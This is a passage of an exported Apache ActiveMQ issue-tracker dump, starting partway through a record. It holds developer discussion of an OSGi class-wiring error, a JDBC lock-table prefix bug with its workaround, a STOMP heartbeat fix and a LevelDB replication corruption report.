BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/geronimo-j2ee-management_1.1_spec-1.0.1.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/geronimo-jacc_1.1_spec-1.0.1.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/activemq-web-5.9.0.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/activemq-pool-5.9.0.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/activemq-jms-pool-5.9.0.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/activemq-client-5.9.0.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/rome-1.0.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/jdom-1.0.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/spring-webmvc-3.2.4.RELEASE.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/spring-beans-3.2.4.RELEASE.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/spring-context-3.2.4.RELEASE.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/spring-core-3.2.4.RELEASE.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/spring-expression-3.2.4.RELEASE.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/spring-web-3.2.4.RELEASE.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/aopalliance-1.0.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/spring-aop-3.2.4.RELEASE.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/activemq-console-5.9.0.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/activemq-kahadb-store-5.9.0.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/activemq-broker-5.9.0.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/activemq-openwire-legacy-5.9.0.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/activemq-protobuf-1.1.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/commons-net-3.3.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/activeio-core-3.1.4.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/commons-pool-1.6.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/hawtbuf-proto-1.9.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/hawtbuf-1.9.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/jackson-core-asl-1.9.12.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/jackson-mapper-asl-1.9.12.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/velocity-1.7.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/commons-collections-3.2.1.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/commons-lang-2.6.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/org.apache.servicemix.bundles.josql-1.5_5.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/jasypt-1.9.1.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/commons-daemon-1.0.15.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/activemq-all-5.9.0.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/xbean-spring-3.14.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/commons-logging-1.1.3.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/core-3.1.1.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/slf4j-api-1.7.5.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/slf4j-log4j12-1.7.5.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/log4j-1.2.17.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/sitemesh-2.4.2.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/jstl-1.1.2.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/standard-1.1.2.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/xpp3-1.1.4c.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/xstream-1.4.4.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/xmlpull-1.1.3.1.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[/home/amichai/apps/itrade/apache-karaf-2.3.3/data/cache/org.eclipse.osgi/bundles/223/1/.cp/WEB-INF/lib/xpp3_min-1.1.4c.jar].findClassImpl(javax.net.ssl.SSLServerSocket)
BundleClassLoader[org.apache.activemq.activemq-web-console_5.9.0].loadClass(javax.net.ssl.SSLServerSocket) failed.
java.lang.ClassNotFoundException: javax.net.ssl.SSLServerSocket
	at org.eclipse.osgi.internal.loader.BundleLoader.findClassInternal(BundleLoader.java:501)
	at org.eclipse.osgi.internal.loader.BundleLoader.findClass(BundleLoader.java:421)
	at org.eclipse.osgi.internal.loader.BundleLoader.findClass(BundleLoader.java:412)
	at org.eclipse.osgi.internal.baseadaptor.DefaultClassLoader.loadClass(DefaultClassLoader.java:107)
	at java.lang.ClassLoader.loadClass(ClassLoader.java:358)
	at org.apache.activemq.util.IntrospectionSupport.setProperty(IntrospectionSupport.java:163)
	at org.apache.activemq.util.IntrospectionSupport.setProperties(IntrospectionSupport.java:151)
	at org.apache.activemq.transport.failover.FailoverTransportFactory.createTransport(FailoverTransportFactory.java:74)
	at org.apache.activemq.transport.failover.FailoverTransportFactory.createTransport(FailoverTransportFactory.java:63)
	at org.apache.activemq.transport.failover.FailoverTransportFactory.doConnect(FailoverTransportFactory.java:38)
	at org.apache.activemq.transport.TransportFactory.connect(TransportFactory.java:64)
	at org.apache.activemq.ActiveMQConnectionFactory.createTransport(ActiveMQConnectionFactory.java:258)
	at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:273)
	at org.apache.activemq.ActiveMQConnectionFactory.createActiveMQConnection(ActiveMQConnectionFactory.java:246)
	at org.apache.activemq.ActiveMQConnectionFactory.createConnection(ActiveMQConnectionFactory.java:186)
	at com.myproject.bus.activemq.ActiveMQSession.createConnection(ActiveMQSession.java:33)
	at com.myproject.messaging.jms.Session.open(Session.java:71)
	at com.myproject.messaging.jms.Session$1.run(Session.java:109)
	at java.lang.Thread.run(Thread.java:744)
{noformat}
{quote}
;;;","09/Dec/13 07:24;ggrzybek;I'd have hard work trying to mimic your configuration - your bundle 223 seem to be my bundle 120 which is the bundle with symbolic name {{org.apache.activemq.activemq-web-console}}.

From the latest debug you've send I can see what I've confirmed with simple test - I've uninstalled bundle {{activemq-osgi}} so all imports from my app's bundles to activemq were resolved against imports from {{org.apache.activemq.activemq-web-console}}. This bundle have nested dependencies which are exported to the system.

And after restart, I got nice and beautiful:
{noformat}
Exception in thread ""Thread-38"" java.lang.NoClassDefFoundError: javax/net/ssl/SSLServerSocket
        at org.apache.activemq.util.IntrospectionSupport.setProperty(IntrospectionSupport.java:163)
        at org.apache.activemq.util.IntrospectionSupport.setProperties(IntrospectionSupport.java:151)
{noformat}

:)

I don't know why you're bundle seem to be resolved against web console bundle instead of proper activemq bundle. The web console's {{WEB-INF/lib}} dependencies are *not* OSGi bundles! So even if web console exports these dependencies' packages, the web console's bundle does ""not"" import {{javax.net.ssl}} (only {{javax.net}}) - and it's hardcoded in https://github.com/apache/activemq/blob/activemq-5.9.0/activemq-web-console/pom.xml#L142.

Check your bundles (use e.g., {{packages:exports}} gogo command). You can also add this code before connecting to ActiveMQ:
{code:java}
List<BundleWire> list = FrameworkUtil.getBundle(this.getClass()).adapt(BundleWiring.class).getRequiredWires(null);
for (BundleWire bw: list) {
   System.out.println(bw.getRequirement() + "" -> "" + bw.getProvider());
}
{code}

I got (after uninstalling {{activemq-osgi}}):
{noformat}
...
osgi.wiring.package; resolution:=""mandatory""; filter:=""(&(osgi.wiring.package=org.apache.activemq))"" -> org.apache.activemq.activemq-web-console_5.9.0
...
{noformat}
and this wiring leads straight to NCDFE (because web console doesn't import {{javax.net.ssl}}

So your problem seem to be related with single thing - your bundle has been wired to {{org.apache.activemq.activemq-web-console_5.9.0}} instead of {{activemq-osgi}}...

regards
Grzegorz Grzybek;;;","09/Dec/13 12:36;amichai;I really appreciate you taking the time to try and resolve this issue, Grzegorz :-)

So what would you say the core issue is? The activemq-web-console bundle exporting activemq packages that it shouldn't be exporting?
;;;","09/Dec/13 12:45;ggrzybek;Theoretically your {{Import-Package}} for {{org.apache.activemq}} should be satisfied by *any* relevant {{Export-Package}} - I don't know why Equinox chooses the export from the console and not the {{activemq-osgi}} - the spec says it chooses the export from the _first resolved bundle_ - what are the bundle ids of {{org.apache.activemq.activemq-web-console}} and {{activemq-osgi}}? (check {{osgi:list}}).
What you said that after the problem occurs, it exists after the restarts - it exists, because Equinox caches the state of resolution (and bundle wiring through Import-Export connections).

I think that cutting of all the exports from {{activemq-web-console}} should resolve the problem - also uninstallng the console. But I'm only a humble open source enthusiast and cannot decide what this bundle exports...

try stopping the {{activemq-web-console}} bundle (you have id=223):
{noformat}
osgi:stop 223
osgi:update 223
{noformat}
first command changes its state to {{resolved}}, second - to {{installed}}. Then try restarting your bundles.

I think that eventually web console should *not* export its internal JARs' packages...

regards
Grzegorz Grzybek;;;","09/Dec/13 14:27;amichai;I tried it out - stopping and updating the web console bundle does fix the issue (until the next app bundle deploy, that is), but only after a Karaf restart. It seems that during runtime the existing wirings remain intact even when the bundle is in Installed state. To see this, I used the dev:show-tree command (on my bus bundle) before stopping the web console bundle:
{quote}
{noformat}
+- org.apache.activemq.activemq-web-console [223]
|  +- org.apache.geronimo.specs.geronimo-servlet_2.5_spec [78]
|  +- org.ops4j.pax.logging.pax-logging-api [4]
|  +- org.ops4j.pax.web.pax-web-jsp [219]
|  |  +- org.ops4j.pax.logging.pax-logging-api [4]
|  |  +- org.apache.geronimo.specs.geronimo-servlet_2.5_spec [78]
|  +- org.apache.felix.configadmin [5]
|  +- org.eclipse.jetty.continuation [85]
|     +- org.apache.geronimo.specs.geronimo-servlet_2.5_spec [78]
|     +- org.mortbay.jetty.util [157]
|        +- org.ops4j.pax.logging.pax-logging-api [4]
|        +- org.apache.geronimo.specs.geronimo-servlet_2.5_spec [78]
...
{noformat}
{quote}
and after osgi:stop and osgi:update (in Intalled state):
{quote}
{noformat}
+- org.apache.activemq.activemq-web-console [223]
...
{noformat}
{quote}
i.e. the bundle itself is still there, even though the entire subtree under it is gone (I don't know what that means).
Just for completeness, after the Karaf restart (the web console bundle now shows up back as Resolved) it is indeed wired properly to the activemq-osgi bundle instead:
{quote}
{noformat}
+- org.apache.activemq.activemq-osgi [200]
...
{noformat}
{quote}

So now there are a few open questions:
- Is this the correct behavior when stopping a bundle, or a bug in Equinox/Karaf? (I was expecting the console bundle to no longer be used, and a new wiring to activemq-osgi to happen at runtime when the console bundle was stopped without requiring a restart, but my assumption may be wrong.)
- Why was it wiring to the web console bundle (223) rather than activemq-osgi (200) in the first place? Is this just a race condition during startup? Do the bundle ids have anything to do with it?
- I too think the original problem is with the web console bundle export configuration. It should probably only be exporting the packages under org.apache.activemq.web*, if at all. Btw the org.apache.activemq.web.config package seems to be split between this bundle and one of the embedded jars in WEB-INF/lib, which is probably not so good for osgi either. Can a developer familiar with the activemq-web-console bundle confirm which exports are really needed there?
;;;","26/Jun/14 08:53;jbonofre;It's fixed in ActiveMQ 5.10.0 and 5.9.2-SNAPSHOT.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
 lease-database-locker does not use the configured tablePrefix in UPDATE statement,AMQ-4841,12676937,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,davsclaus,pgfox,pgfox,31/Oct/13 19:33,02/Apr/14 23:59,14/Jul/23 05:43,01/Nov/13 11:45,5.9.0,,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,"Using the configuration
{code}
<persistenceAdapter>
  <jdbcPersistenceAdapter dataDirectory=""${activemq.data}"" dataSource=""#mysql-ds"" lockKeepAlivePeriod=""5000"">
    <locker>
      <lease-database-locker lockAcquireSleepInterval=""10000""/>
    </locker>
    <statements>
      <statements tablePrefix=""TTT_"" messageTableName=""AMQ_MSGS"" durableSubAcksTableName=""AMQ_ACKS"" lockTableName=""AMQ_LOCK""/>
    </statements>
    <adapter>
       <mysql-jdbc-adapter/>
     </adapter>
  </jdbcPersistenceAdapter>
</persistenceAdapter>
{code}

The logging show the Lock table was created WITH the configured prefix but the lease locker UPDATE statement does not use that prefix

{code}
2013-10-30 14:33:03,245 | DEBUG | Executing SQL: CREATE TABLE TTT_AMQ_LOCK( ID BIGINT NOT NULL, TIME BIGINT, BROKER_NAME VARCHAR(250), PRIMARY KEY (ID) ) ENGINE=INNODB | org.apache.activemq.store.jdbc.adapter.DefaultJDBCAdapter | main

...

2013-10-30 14:33:10,889 | DEBUG | jdbcBroker, lease keepAlive Query is UPDATE ACTIVEMQ_LOCK SET BROKER_NAME=?, TIME=? WHERE BROKER_NAME=? AND ID = 1 | org.apache.activemq.store.jdbc.LeaseDatabaseLocker | ActiveMQ JDBC PA Scheduled Task
{code}",- tested on latest trunk,davsclaus,pgfox,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,"31/Oct/13 19:34;pgfox;JDBCLockTablePrefixTest.java;https://issues.apache.org/jira/secure/attachment/12611460/JDBCLockTablePrefixTest.java",,,,,,,,,,,,,,,,,,,,,1.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,356313,,,Fri Nov 01 11:45:56 UTC 2013,,,,,,,,,,,"0|i1pfcn:",356601,,,,,,,,,,,,,,,,,,,,,"31/Oct/13 19:34;pgfox;JDBCLockTablePrefixTest attached;;;","31/Oct/13 19:38;pgfox;WORKAROUND
============
A simple workaround to this is to reorder the configured elements within  ""jdbcPersistenceAdapter"" element so ""locker"" is after the ""statement"" element.

{code}

<persistenceAdapter>
    <jdbcPersistenceAdapter dataDirectory=""${activemq.data}"" dataSource=""#mysql-ds"" lockKeepAlivePeriod=""5000"">
	<statements>
	  <statements tablePrefix=""TTT_"" messageTableName=""AMQ_MSGS"" durableSubAcksTableName=""AMQ_ACKS"" lockTableName=""AMQ_LOCK""/>
	</statements>
        <adapter>
	  <mysql-jdbc-adapter/>
	</adapter>
	<locker>
	  <lease-database-locker lockAcquireSleepInterval=""10000""/>
	</locker>
  </jdbcPersistenceAdapter>
</persistenceAdapter>

{code}

The above config results in the locker using the prefix table name in the UPDATE statement

{code}
...
2013-10-30 14:36:01,041 | DEBUG | jdbcBroker, lease keepAlive Query is UPDATE TTT_AMQ_LOCK SET BROKER_NAME=?, TIME=? WHERE BROKER_NAME=? AND ID = 1 | org.apache.activemq.store.jdbc.LeaseDatabaseLocker | ActiveMQ JDBC PA Scheduled Task
...
{code}
;;;","01/Nov/13 10:04;davsclaus;Yeah its an ordering issue, the locker gets the ""default"" statements. And no the later configured.;;;","01/Nov/13 11:45;davsclaus;Thanks Pat for reporting the issue, the workaround, and the test case.;;;",,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
Invalid STOMP frame sent on websocket connections with heartbeats.,AMQ-4840,12676688,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Major,Fixed,chirino,chirino,chirino,30/Oct/13 17:53,12/Mar/14 03:02,14/Jul/23 05:43,12/Mar/14 03:02,5.9.0,,,,,5.10.0,5.9.1,,Broker,,,,0,,,,,,,,,a KEEPALIVE frame was being sent by ActiveMQ to stomp websocket clients that enabled heartbeats. ,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,0.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,356120,,,2013-10-30 17:53:20.0,,,,,,,,,,,"0|i1pe67:",356408,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
LevelDB corrupted when in a replication cluster,AMQ-4837,12676619,,Bug,Resolved,AMQ,ActiveMQ,software,bsnyder,"<a href=""http://activemq.apache.org/"">Apache ActiveMQ</a> is the most popular and powerful open source Message Broker. Apache ActiveMQ is fast, supports many <a href=""http://activemq.apache.org/cross-language-clients.html"">Cross Language Clients and Protocols</a> and many <a href=""http://activemq.apache.org/features.html"">advanced features<a> while fully supporting JMS 1.1 and J2EE 1.4. Apache ActiveMQ is released under the Apache 2.0 License",http://activemq.apache.org/,Critical,Fixed,chirino,Gnome,Gnome,30/Oct/13 12:38,12/Mar/14 03:03,14/Jul/23 05:43,16/Jan/14 17:45,5.9.0,,,,,5.10.0,5.9.1,,LevelDB,,,,0,,,,,,,,,"I have clustered 3 ActiveMQ instances using replicated leveldb and zookeeper. When performing some tests using Web UI, I can across issues that appears to corrupt the leveldb data files.

The issue can be replicated by performing the following steps:
1.	Start 3 activemq nodes.
2.	Push a message to the master (Node1) and browse the queue using the web UI
3.	Stop master node (Node1)
4.	Push a message to the new master (Node2) and browse the queue using the web UI. Message summary and queue content ok.
5.	Start Node1
6.	Stop master node (Node2)
7.	Browse the queue using the web UI on new master (Node3). Message summary ok however when clicking on the queue, no message details. An error (see below) is logged by the master, which attempts a restart.

From this point, the database appears to be corrupted and the same error occurs to each node infinitely (shutdown/restart). The only way around is to stop the nodes and clear the data files.

However when a message is pushed between step 5 and 6, the error doesn’t occur.

=================================
Leveldb configuration on the 3 instances:
		<persistenceAdapter>
			<replicatedLevelDB
					directory=""${activemq.data}/leveldb""
					replicas=""3""
					bind=""tcp://0.0.0.0:0""
					zkAddress=""zkserver:2181""
					zkPath=""/activemq/leveldb-stores""
					/>
		</persistenceAdapter>

=================================
The error is:
INFO | Stopping BrokerService[localhost] due to exception, java.io.IOException
java.io.IOException
        at org.apache.activemq.util.IOExceptionSupport.create(IOExceptionSupport.java:39)
        at org.apache.activemq.leveldb.LevelDBClient.might_fail(LevelDBClient.scala:543)
        at org.apache.activemq.leveldb.LevelDBClient.might_fail_using_index(LevelDBClient.scala:974)
        at org.apache.activemq.leveldb.LevelDBClient.collectionCursor(LevelDBClient.scala:1270)
        at org.apache.activemq.leveldb.LevelDBClient.queueCursor(LevelDBClient.scala:1194)
        at org.apache.activemq.leveldb.DBManager.cursorMessages(DBManager.scala:708)
       at org.apache.activemq.leveldb.LevelDBStore$LevelDBMessageStore.recoverNextMessages(LevelDBStore.scala:741)
        at org.apache.activemq.broker.region.cursors.QueueStorePrefetch.doFillBatch(QueueStorePrefetch.java:106)
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.fillBatch(AbstractStoreCursor.java:258)
        at org.apache.activemq.broker.region.cursors.AbstractStoreCursor.reset(AbstractStoreCursor.java:108)
        at org.apache.activemq.broker.region.cursors.StoreQueueCursor.reset(StoreQueueCursor.java:157)
        at org.apache.activemq.broker.region.Queue.doPageInForDispatch(Queue.java:1875)
        at org.apache.activemq.broker.region.Queue.pageInMessages(Queue.java:2086)
        at org.apache.activemq.broker.region.Queue.iterate(Queue.java:1581)
        at org.apache.activemq.thread.PooledTaskRunner.runTask(PooledTaskRunner.java:129)
        at org.apache.activemq.thread.PooledTaskRunner$1.run(PooledTaskRunner.java:47)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at java.lang.Thread.run(Thread.java:722)
Caused by: java.lang.NullPointerException
        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$queueCursor$1.apply(LevelDBClient.scala:1198)
        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$queueCursor$1.apply(LevelDBClient.scala:1194)
        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1$$anonfun$apply$mcV$sp$12.apply(LevelDBClient.scala:1272)
        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1$$anonfun$apply$mcV$sp$12.apply(LevelDBClient.scala:1271)
        at org.apache.activemq.leveldb.LevelDBClient$RichDB.check$4(LevelDBClient.scala:315)
        at org.apache.activemq.leveldb.LevelDBClient$RichDB.cursorRange(LevelDBClient.scala:317)
        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1.apply$mcV$sp(LevelDBClient.scala:1271)
        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1.apply(LevelDBClient.scala:1271)
        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$collectionCursor$1.apply(LevelDBClient.scala:1271)
        at org.apache.activemq.leveldb.LevelDBClient.usingIndex(LevelDBClient.scala:968)
        at org.apache.activemq.leveldb.LevelDBClient$$anonfun$might_fail_using_index$1.apply(LevelDBClient.scala:974)
        at org.apache.activemq.leveldb.LevelDBClient.might_fail(LevelDBClient.scala:540)
        ... 17 more

","CentOS, Linux version 2.6.32-71.29.1.el6.x86_64
java-1.7.0-openjdk.x86_64/java-1.6.0-openjdk.x86_64
zookeeper-3.4.5.2",chirino,Gnome,meurwinn,noelo,rajdavies,remogloor,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,,AMQ-4917,,,AMQ-4882,,,,,,,,,,,,,"30/Oct/13 12:47;Gnome;LevelDBCorrupted.zip;https://issues.apache.org/jira/secure/attachment/12611049/LevelDBCorrupted.zip","18/Nov/13 13:22;meurwinn;activemq.xml;https://issues.apache.org/jira/secure/attachment/12614384/activemq.xml",,,,,,,,,,,,,,,,,,,,2.0,,,,,,,,,,,,,,,,,,,,,,false,,,,,,,,,,,,,,,,,356051,,,Thu Jan 16 17:45:45 UTC 2014,,,,,,,,,,,"0|i1pdqv:",356339,,,,,,,,,,,,,,,,,,,,,"30/Oct/13 12:47;Gnome;Attached the ActiveMQ configuration and the logs of the 3 nodes. 
WRK01 is first elected as Master, then WRK02, then WRK03 (fails).
;;;","30/Oct/13 15:44;Gnome;Note that the problem also occurs when the replication sync parameter is set to quorum_disk and quorum_mem.
;;;","30/Oct/13 16:32;chirino;Looking into it...;;;","30/Oct/13 16:44;chirino;I failed to reproduce using the procedure outlined.  I was testing on 3 Fedora Core 18 VMs.

